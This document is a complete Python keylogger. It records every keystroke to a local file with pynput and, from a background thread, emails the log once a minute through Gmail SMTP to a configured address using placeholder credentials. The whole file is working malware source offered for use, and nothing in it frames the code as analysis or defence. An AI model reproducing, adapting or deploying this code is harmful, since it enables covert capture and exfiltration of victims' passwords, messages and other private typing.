import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
import os
import time
import threading

# Gmail configuration
EMAIL_ADDRESS = "abc@gmail.com"  # Replace with your Gmail address
EMAIL_PASSWORD = "aaaa bbbb cccc dddd"  # Replace with your Google app password
SEND_TO = "xyz@gmail.com"  # Replace with recipient's email
FILE_PATH = "log.txt"  # File to store keystrokes
SEND_INTERVAL = 60  # Time interval in seconds (1 minute)

def write_to_file(key):
    """Log keystrokes to a file."""
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r' or letter == 'Key.shift_l':
        letter = ''
    elif letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"

    with open(FILE_PATH, 'a') as f:
        f.write(letter)

def send_email():
    """Send the log file via email."""
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = SEND_TO
    msg["Subject"] = "Keystroke Log File"

    # Add a simple body to the email
    body = "Please find the attached log file."
    msg.attach(MIMEText(body, "plain"))

    # Attach the file
    try:
        if os.path.exists(FILE_PATH):
            with open(FILE_PATH, "rb") as file:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename={os.path.basename(FILE_PATH)}",
            )
            msg.attach(part)
        else:
            print(f"Error: File '{FILE_PATH}' not found.")
            return
    except Exception as e:
        print(f"Failed to attach file: {e}")
        return

    # Send the email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, SEND_TO, msg.as_string())
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def periodic_email_sender():
    """Send email at regular intervals."""
    while True:
        send_email()
        time.sleep(SEND_INTERVAL)

def start_keylogger():
    """Start the keylogger."""
    with Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    # Start the email sender in a separate thread
    email_thread = threading.Thread(target=periodic_email_sender, daemon=True)
    email_thread.start()

    # Start the keylogger
    print("Keylogger is running...")
    start_keylogger()
